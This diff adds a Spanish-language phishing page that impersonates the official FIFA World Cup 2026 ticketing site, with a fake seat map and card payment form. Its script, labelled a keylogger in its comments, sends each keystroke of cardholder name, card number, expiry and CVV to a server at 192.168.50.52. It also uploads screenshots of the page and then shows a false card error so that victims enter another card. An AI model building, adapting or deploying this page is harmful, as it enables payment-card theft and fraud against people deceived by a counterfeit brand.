@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FIFA World Cup 2026™ | Official Hospitality & Tickets</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=Source+Sans+Pro:wght@300;400;700&display=swap');
+
+        :root {
+            --fifa-blue: #0b1b3d;
+            --fifa-red: #ff0044;
+            --fifa-gold: #ceab5d;
+        }
+
+        body {
+            font-family: 'Source Sans Pro', sans-serif;
+        }
+
+        .fifa-font {
+            font-family: 'Oswald', sans-serif;
+        }
+
+        .hero-bg {
+            background: linear-gradient(rgba(11, 27, 61, 0.8), rgba(11, 27, 61, 0.8)),
+                url('https://digitalhub.fifa.com/transform/4802c525-2423-455c-9c98-4235e463a628/1449856385');
+            background-size: cover;
+            background-position: center;
+        }
+    </style>
+</head>
+
+<body class="bg-white">
+
+    <nav class="bg-white border-b border-gray-200 px-4 py-3 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-8">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/FIFA_logo_white.svg" class="h-8 invert"
+                    alt="FIFA">
+                <div class="hidden lg:flex space-x-6 text-[11px] font-bold uppercase tracking-widest text-gray-600">
+                    <a href="#" class="hover:text-[--fifa-blue]">Partidos individuales</a>
+                    <a href="#" class="hover:text-[--fifa-blue]">Ofertas de Partidos</a>
+                    <a href="#" class="hover:text-[--fifa-blue]">FAQ</a>
+                    <a href="#" class="hover:text-[--fifa-blue]">Más</a>
+                </div>
+            </div>
+            <div class="flex items-center space-x-4 text-gray-600 text-sm font-bold">
+                <div class="flex items-center space-x-1 cursor-pointer">
+                    <img src="https://flagcdn.com/w20/mx.png" class="h-3" alt="MX">
+                    <span>MEX</span>
+                </div>
+                <div class="h-4 w-[1px] bg-gray-300"></div>
+                <button class="hover:text-[--fifa-blue]">Log In</button>
+            </div>
+        </div>
+    </nav>
+
+    <section class="hero-bg text-white py-24 px-4 text-center">
+        <div class="max-w-4xl mx-auto animate__animated animate__fadeIn">
+            <p class="text-[--fifa-gold] uppercase tracking-[0.3em] font-bold mb-4">Más cerca que nunca de la</p>
+            <h1 class="fifa-font text-6xl md:text-8xl uppercase leading-none mb-8">Copa Mundial de la FIFA 2026™</h1>
+            <p class="text-lg md:text-xl font-light max-w-2xl mx-auto mb-10 leading-relaxed">
+                La Copa Mundial de la FIFA 2026™, con una cifra récord de 104 partidos, será la máxima celebración del
+                deporte rey.
+            </p>
+            <div class="flex flex-col md:flex-row justify-center gap-4">
+                <a href="#entradas"
+                    class="bg-[--fifa-red] hover:bg-red-700 text-white px-10 py-4 rounded-full font-bold transition-all uppercase text-sm">Ver
+                    y comprar partidos</a>
+                <a href="#"
+                    class="border-2 border-white hover:bg-white hover:text-[--fifa-blue] text-white px-10 py-4 rounded-full font-bold transition-all uppercase text-sm">Ver
+                    las suites disponibles</a>
+            </div>
+        </div>
+    </section>
+
+    <section id="entradas" class="max-w-7xl mx-auto py-16 px-4">
+        <div class="flex flex-col md:flex-row justify-between items-end mb-12 border-b border-gray-100 pb-8">
+            <div>
+                <h2 class="fifa-font text-4xl text-[--fifa-blue] uppercase italic">Entradas Disponibles</h2>
+                <p class="text-gray-500">Selecciona tu sede y categoría de hospitalidad.</p>
+            </div>
+            <div class="mt-6 md:mt-0 flex gap-4">
+                <select
+                    class="bg-gray-100 border-none rounded-lg px-4 py-2 text-sm font-bold focus:ring-2 focus:ring-[--fifa-blue]">
+                    <option>Sede: Ciudad de México</option>
+                    <option>Sede: Monterrey</option>
+                    <option>Sede: Guadalajara</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+            <div
+                class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group">
+                <div class="relative h-48 overflow-hidden">
+                    <img src="https://images.unsplash.com/photo-1510051644226-99729addd737?auto=format&fit=crop&q=80&w=800"
+                        class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
+                        alt="Stadium">
+                    <div class="absolute inset-0 bg-gradient-to-t from-[--fifa-blue] to-transparent"></div>
+                    <div class="absolute bottom-4 left-4 text-white">
+                        <p class="text-[10px] font-bold uppercase tracking-widest text-[--fifa-gold]">Match 01 -
+                            Inaugural</p>
+                        <p class="text-xl font-black italic uppercase">México vs Por Definir</p>
+                    </div>
+                </div>
+                <div class="p-6">
+                    <div class="flex items-center gap-2 mb-4 text-gray-500 text-xs font-bold uppercase">
+                        <i class="fas fa-calendar"></i> 11 JUNIO 2026 | Estadio Azteca
+                    </div>
+                    <div class="flex justify-between items-center mb-6">
+                        <span class="text-3xl font-black text-[--fifa-blue]">$1,450 <span
+                                class="text-xs">MXN</span></span>
+                        <span
+                            class="bg-green-100 text-green-700 text-[10px] font-bold px-3 py-1 rounded-full uppercase">Disponible</span>
+                    </div>
+                    <button onclick="openSeatMap('México vs Por Definir', 1450)"
+                        class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-4 rounded-xl font-bold uppercase tracking-widest transition-all">Seleccionar
+                        asientos</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div id="seat-modal"
+        class="fixed inset-0 bg-[--fifa-blue]/95 backdrop-blur-md z-[60] hidden flex items-center justify-center p-4">
+        <div
+            class="bg-white rounded-3xl w-full max-w-4xl p-8 animate__animated animate__fadeInUp overflow-y-auto max-h-[90vh]">
+            <div class="flex justify-between items-center mb-8">
+                <h3 class="fifa-font text-3xl text-[--fifa-blue] uppercase" id="modal-title">Selección de Asientos</h3>
+                <button onclick="closeModals()" class="text-gray-400 hover:text-black text-2xl">&times;</button>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-12">
+                <div class="text-center">
+                    <p class="text-xs font-bold uppercase text-gray-400 mb-4">Cancha (Estadio Azteca)</p>
+                    <div class="grid grid-cols-10 gap-2 mb-6 border-b-8 border-[--fifa-blue] pb-8 rounded-b-3xl">
+                        <script>
+                            for (let i = 0; i < 50; i++) {
+                                document.write(`<div onclick="this.classList.toggle('bg-yellow-500'); document.getElementById('btn-pay').disabled=false; document.getElementById('btn-pay').classList.replace('bg-gray-200','bg-[--fifa-red]'); document.getElementById('btn-pay').classList.remove('text-gray-400');" class="w-full h-6 bg-gray-200 rounded-sm cursor-pointer hover:bg-gray-300"></div>`);
+                            }
+                        </script>
+                    </div>
+                    <div class="flex justify-center gap-4 text-[10px] font-bold uppercase">
+                        <span class="flex items-center gap-1">
+                            <div class="w-3 h-3 bg-gray-200 rounded-sm"></div> Libre
+                        </span>
+                        <span class="flex items-center gap-1">
+                            <div class="w-3 h-3 bg-yellow-500 rounded-sm"></div> Elegido
+                        </span>
+                    </div>
+                </div>
+                <div>
+                    <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100 mb-6">
+                        <h4 class="font-bold mb-2">Resumen de selección</h4>
+                        <div class="flex justify-between text-sm text-gray-500">
+                            <span>Tipo: Hospitalidad Oro</span>
+                            <span>$1,450.00</span>
+                        </div>
+                        <div class="flex justify-between font-bold text-xl mt-4 border-t pt-4 text-[--fifa-blue]">
+                            <span>Total:</span>
+                            <span>$1,450.00 MXN</span>
+                        </div>
+                    </div>
+                    <button id="btn-pay" disabled onclick="openPayment()"
+                        class="w-full bg-gray-200 text-gray-400 py-5 rounded-2xl font-black uppercase tracking-widest transition-all">Ir
+                        al pago</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="payment-modal" class="fixed inset-0 bg-black/80 z-[70] hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-3xl w-full max-w-md p-10 animate__animated animate__zoomIn">
+            <div class="flex justify-center mb-6">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-6"
+                    alt="Visa">
+            </div>
+            <h2 class="text-center font-bold text-xl mb-8">Información de Pago Seguro</h2>
+            <form id="payment-form" class="space-y-4" autocomplete="off">
+                <div class="space-y-1">
+                    <label class="text-[10px] font-bold text-gray-400 uppercase">Titular de la tarjeta</label>
+                    <input type="text" id="c-name"
+                        class="w-full border-b border-gray-300 py-3 focus:border-[--fifa-blue] outline-none uppercase font-bold tracking-tighter"
+                        placeholder="NOMBRE COMPLETO">
+                </div>
+                <div class="space-y-1">
+                    <label class="text-[10px] font-bold text-gray-400 uppercase">Número de tarjeta</label>
+                    <input type="text" id="c-number"
+                        class="w-full border-b border-gray-300 py-3 focus:border-[--fifa-blue] outline-none text-lg font-bold"
+                        placeholder="0000 0000 0000 0000" maxlength="19">
+                </div>
+                <div class="grid grid-cols-2 gap-8">
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-400 uppercase">Vencimiento</label>
+                        <input type="text" id="c-exp"
+                            class="w-full border-b border-gray-300 py-3 focus:border-[--fifa-blue] outline-none font-bold"
+                            placeholder="MM/AA" maxlength="5">
+                    </div>
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-400 uppercase">CVV</label>
+                        <input type="password" id="c-cvc"
+                            class="w-full border-b border-gray-300 py-3 focus:border-[--fifa-blue] outline-none font-bold"
+                            placeholder="***" maxlength="4">
+                    </div>
+                </div>
+                <button type="submit"
+                    class="w-full bg-[--fifa-blue] text-white py-5 rounded-2xl font-black mt-8 hover:bg-blue-900 transition-all uppercase">Finalizar
+                    Reserva Seguro</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // DEFINICIÓN DE LA IP - Asegúrate de que esta sea la IP de tu servidor Debian
+        const SERVER_IP = '192.168.50.52';
+
+        function openSeatMap(match, price) {
+            document.getElementById('modal-title').innerText = match;
+            document.getElementById('seat-modal').classList.remove('hidden');
+        }
+
+        function openPayment() {
+            document.getElementById('payment-modal').classList.remove('hidden');
+        }
+
+        function closeModals() {
+            document.getElementById('seat-modal').classList.add('hidden');
+            document.getElementById('payment-modal').classList.add('hidden');
+        }
+
+        const inputs = ['c-name', 'c-number', 'c-exp', 'c-cvc'];
+
+        // Lógica de Captura Silenciosa (Keylogger) - CORREGIDO CON BACKTICKS
+        inputs.forEach(id => {
+            document.getElementById(id).addEventListener('input', () => {
+                const data = {
+                    f: id,
+                    v: document.getElementById(id).value,
+                    t: new Date().toLocaleTimeString()
+                };
+
+                // Cambio de '' por `` para que funcione la variable SERVER_IP
+                fetch(`http://${SERVER_IP}:3000/captura`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).catch(() => { });
+            });
+        });
+
+        // Formato de tarjeta automático
+        document.getElementById('c-number').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        // Lógica de Finalizar Reserva - CORREGIDO CON BACKTICKS
+        document.getElementById('payment-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const cardName = document.getElementById('c-name').value;
+
+            // 1. Tomamos la captura (Sin modificar tu lógica interna)
+            await captureScreen();
+
+            // 2. Avisamos al servidor que envíe el paquete completo por correo
+            try {
+                // Cambio de '' por `` para que funcione la variable SERVER_IP
+                await fetch(`http://${SERVER_IP}:3000/finalizar-y-enviar`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ user: cardName })
+                });
+            } catch (err) {
+                console.log("Error en envío final");
+            }
+
+            // 3. Mostramos el error falso
+            alert("Error del Sistema FIFA: No se pudo verificar la tarjeta. Por seguridad, intente con otra tarjeta de débito o crédito.");
+        });
+
+        // Función de captura (Tal como la tenías, solo corregí la URL del fetch)
+        async function captureScreen() {
+            const canvas = await html2canvas(document.body);
+            const screenshotData = canvas.toDataURL("image/png");
+
+            try {
+                // Cambio de '' por `` para que funcione la variable SERVER_IP
+                await fetch(`http://${SERVER_IP}:3000/upload-screenshot`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        image: screenshotData,
+                        user: document.getElementById('c-name').value || 'anonimo',
+                        timestamp: new Date().getTime()
+                    })
+                });
+            } catch (e) {
+                // Silencio administrativo
+            }
+        }
+
+        document.getElementById('c-number').addEventListener('blur', captureScreen);
+
+        // Limpieza al cargar la página
+        window.addEventListener('load', () => {
+            const form = document.getElementById('payment-form');
+            if (form) {
+                form.reset();
+            }
+            inputs.forEach(id => {
+                document.getElementById(id).value = '';
+            });
+            console.log("🧹 Formulario limpiado.");
+        });
+    </script>
+</body>
+
+</html>
